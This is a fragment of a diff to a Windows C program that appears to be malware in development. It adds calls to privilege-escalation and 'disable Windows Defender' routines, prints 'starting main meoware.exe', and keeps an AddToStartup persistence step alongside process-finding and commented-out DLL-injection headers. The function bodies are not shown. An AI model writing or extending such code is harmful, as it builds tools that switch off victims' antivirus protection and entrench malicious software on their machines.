@@ -1,8 +1,10 @@
 ﻿#include <stdio.h>
 #include <windows.h>
 #include "add_to_startup.h"
-//#include "dll_inj.h"
+#include "priv_esc.h"
+#include "disable_windef.h"
 #include "find_pid.h"
+//#include "dll_inj.h"
 
 const char* k = "[+]";
 const char* i = "[*]";
@@ -86,11 +88,16 @@ int main(int arcg,char* argv[]) {
 	PID = atoi(argv[1]);
 	*/
 	PID = get_pid();
-	if (PID== 0)
-	{
-		return EXIT_FAILURE;
-	}
-	printf("%s the process id is :(%ld)\n",i,PID);
+
+	priv_esc();
+	printf(" %s trying to disable windows defender...\n",k);
+
+	if (!dis_windef()) { printf("%s faild disable windows defender :(\n",e); }
+
+	printf("%s starting main meoware.exe...\n",i);
+
+
+
 
 	AddToStartup();
 
